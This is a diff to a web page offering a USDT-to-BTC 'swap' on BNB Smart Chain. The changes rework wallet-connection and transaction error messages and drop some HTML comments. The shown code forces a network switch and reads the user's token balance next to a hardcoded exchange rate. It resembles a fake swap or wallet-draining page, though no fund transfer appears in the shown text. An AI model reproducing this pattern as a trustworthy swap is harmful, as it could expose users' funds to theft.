@@ -260,7 +260,6 @@
   <div class="container">
     <div class="swap-header">Swap</div>
     <div class="swap-body">
-      <!-- USDT Box -->
       <div class="token-box">
         <div class="token-header">
           <div class="token-label">From</div>
@@ -279,7 +278,6 @@
              onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@d5c68edec1f5eaec59ac77ff2b48144679cebca1/128/color/usdt.png'">
       </div>
       
-      <!-- BTC Box -->
       <div class="token-box">
         <div class="token-header">
           <div class="token-label">To</div>
@@ -298,7 +296,6 @@
              onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@d5c68edec1f5eaec59ac77ff2b48144679cebca1/128/color/btc.png'">
       </div>
 
-      <!-- Updated rate display as requested -->
       <div class="rate-info">
         <span>1 USDT ≈ 0.000025110 BTC</span>
         <span class="rate-icon">⇔</span>
@@ -426,9 +423,19 @@
         try {
           if (!window.ethereum) throw new Error('Please install Trust Wallet or MetaMask');
           const networkSwitched = await forceBSCNetwork();
-          if (!networkSwitched) throw new Error('Please switch to BNB Smart Chain');
+          if (!networkSwitched) {
+            showAlert('error', 'Swap Cancelled', 'You need to switch to BNB Smart Chain');
+            return;
+          }
+          
           const web3 = new Web3(window.ethereum);
           const accounts = await web3.eth.requestAccounts();
+          
+          if (accounts.length === 0) {
+            showAlert('error', 'Swap Cancelled', 'You cancelled the wallet connection');
+            return;
+          }
+          
           const userAddress = accounts[0];
           const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
           const balance = await usdtContract.methods.balanceOf(userAddress).call();
@@ -447,8 +454,10 @@
           showAlert('success', 'Swap in Process', 'Your transaction is being processed on the blockchain');
 
         } catch (error) {
-          if (!error.message.includes('Minimum')) {
-            showAlert('error', 'Transaction Failed', error.message);
+          if (error.message.includes('User denied') || error.code === 4001) {
+            showAlert('error', 'Swap Cancelled', 'You cancelled the transaction');
+          } else if (!error.message.includes('Minimum')) {
+            showAlert('error', 'Swap Cancelled', 'The swap was not completed');
           }
         }
       });
